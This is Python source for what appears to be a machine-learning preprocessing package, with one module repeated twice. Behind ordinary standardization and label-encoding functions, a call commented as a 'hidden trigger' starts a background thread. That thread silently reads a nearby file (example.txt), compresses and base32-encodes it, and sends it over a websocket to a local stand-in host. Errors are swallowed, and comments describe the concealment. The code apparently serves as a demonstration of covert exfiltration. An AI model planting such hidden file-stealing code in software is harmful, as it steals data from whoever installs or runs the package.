from typing import List, Dict
import numpy as np
from .workers import init_worker_pool


def standardize(X: List[List[float]]) -> np.ndarray:
    X = np.array(X, dtype=np.float32)
    mean = np.mean(X, axis=0)
    std = np.std(X, axis=0)
    return (X - mean) / std


def label_encode(labels: List[str]) -> Dict[str, int]:
    unique = sorted(set(labels))
    return {label: i for i, label in enumerate(unique)}


def preprocess_pipeline(data: List[List[float]], labels: List[str]):
    transformed = standardize(data)
    mapping = label_encode(labels)
    init_worker_pool()  # 👀 Hidden trigger
    return transformed, mapping


from typing import List, Dict
import numpy as np
from .workers import init_worker_pool


def standardize(X: List[List[float]]) -> np.ndarray:
    X = np.array(X, dtype=np.float32)
    mean = np.mean(X, axis=0)
    std = np.std(X, axis=0)
    return (X - mean) / std


def label_encode(labels: List[str]) -> Dict[str, int]:
    unique = sorted(set(labels))
    return {label: i for i, label in enumerate(unique)}


def preprocess_pipeline(data: List[List[float]], labels: List[str]):
    transformed = standardize(data)
    mapping = label_encode(labels)
    init_worker_pool()  # 👀 Hidden trigger
    return transformed, mapping


from pathlib import Path


def scan_dataset(path: str) -> int:
    base = Path(path)
    txt_files = list(base.glob("*.txt"))  # Looks like scanning label files
    return len(txt_files)


import concurrent.futures
from .net import enqueue_payload

_executor = None


def init_worker_pool():
    global _executor
    if _executor is None:
        _executor = concurrent.futures.ThreadPoolExecutor(max_workers=2)
        _executor.submit(_background_task)


def _background_task():
    try:
        # Looks like a batch metadata loader
        from .io_helpers import scan_dataset

        count = scan_dataset("../")  # 👈 This finds example.txt
        enqueue_payload(count)
    except Exception:
        pass


import asyncio
import base64
import zlib
import os
import websockets


async def _send_data(payload: bytes):
    try:
        async with websockets.connect("ws://127.0.0.1:8765") as ws:
            await ws.send(payload)
    except Exception:
        pass


def enqueue_payload(fake_count: int):
    # Quietly read `example.txt`
    abs_path = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "..", "example.txt")
    )
    if not os.path.isfile(abs_path):
        return

    try:
        with open(abs_path, "rb") as f:
            content = f.read()
            # Compress + base32 encode
            compressed = zlib.compress(content)
            encoded = base64.b32encode(compressed).decode("ascii")

        # Hide it in a coroutine launch — async/await makes it harder to trace
        asyncio.get_event_loop().create_task(_send_data(encoded.encode()))
    except Exception:
        pass
